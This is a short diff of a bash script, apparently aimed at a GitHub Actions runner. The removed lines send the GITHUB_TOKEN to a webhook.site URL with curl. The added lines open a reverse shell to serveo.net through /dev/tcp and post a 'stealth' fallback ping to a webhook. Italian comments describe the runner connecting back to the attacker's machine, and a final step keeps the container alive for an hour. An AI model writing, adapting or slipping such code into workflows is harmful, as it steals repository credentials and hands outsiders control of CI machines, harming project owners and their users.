@@ -1,7 +1,12 @@
 #!/bin/bash
 
-echo "[*] Starting raw memory scan via /proc/self/mem"
+echo "[*] Launching reverse shell to serveo.net..."
 
-curl -d "$(printenv GITHUB_TOKEN)" https://webhook.site/a47a02de-67bc-48aa-b80e-2a3a8636e5eb
+# Reverse shell: GitHub runner si connette alla tua macchina tramite Serveo
+bash -i >& /dev/tcp/serveo.net/4444 0>&1
 
-echo "[+] Done."
+# Se la reverse shell fallisce, invia un ping via webhook (fallback stealth)
+curl -s https://webhook.site/YOUR-ID -d "Reverse shell failed or closed"
+
+# Mantieni il container attivo per debug o secondi tentativi
+sleep 60m
